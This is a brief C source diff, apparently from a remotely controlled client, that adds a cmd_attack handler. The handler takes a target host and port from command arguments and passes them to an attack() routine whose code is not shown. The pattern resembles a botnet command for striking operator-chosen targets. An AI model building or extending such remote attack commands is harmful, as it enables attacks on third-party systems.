@@ -29,7 +29,9 @@
 #include <string.h>
 #include <unistd.h>
 
+#include "json.h"
 #include "channel.h"
+#include "attack.h"
 
 void cmd_getpid(int channel)
 {
@@ -38,4 +40,14 @@ void cmd_getpid(int channel)
 
     sprintf(pid, "%d", pid_number);
     send_channel(channel, pid);
+}
+
+void cmd_attack(int channel, char *args)
+{
+    JSONObject *json = parseJSON(args);
+
+    char *host = find_json(args, "host");
+    char *port = find_json(args, "port");
+
+    attack(host, port);
 }
